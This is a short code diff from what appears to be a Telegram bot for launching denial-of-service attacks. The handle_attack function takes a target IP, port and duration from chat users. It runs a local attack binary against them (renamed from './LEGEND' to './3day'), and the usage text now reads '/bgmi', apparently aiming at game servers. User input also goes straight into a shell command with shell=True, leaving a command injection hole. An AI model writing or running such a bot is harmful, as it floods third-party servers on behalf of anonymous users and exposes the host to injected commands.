@@ -65,7 +65,7 @@ def handle_attack(message):
         return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ Usage: /3day <IP> <PORT> <TIME> 600")
+        bot.reply_to(message, "⚠️ Usage: /bgmi <IP> <PORT> <TIME>")
         return
 
     target, port, duration = command[1], command[2], command[3]
@@ -87,7 +87,7 @@ def handle_attack(message):
     pending_feedback[user_id] = True
 
     try:
-        subprocess.run(f"./LEGEND {target} {port} {duration} 900", shell=True, check=True, timeout=duration)
+        subprocess.run(f"./3day {target} {port} {duration} 900", shell=True, check=True, timeout=duration)
     except:
         bot.reply_to(message, "❌ Attack fail ya timeout ho gaya.")
     finally:
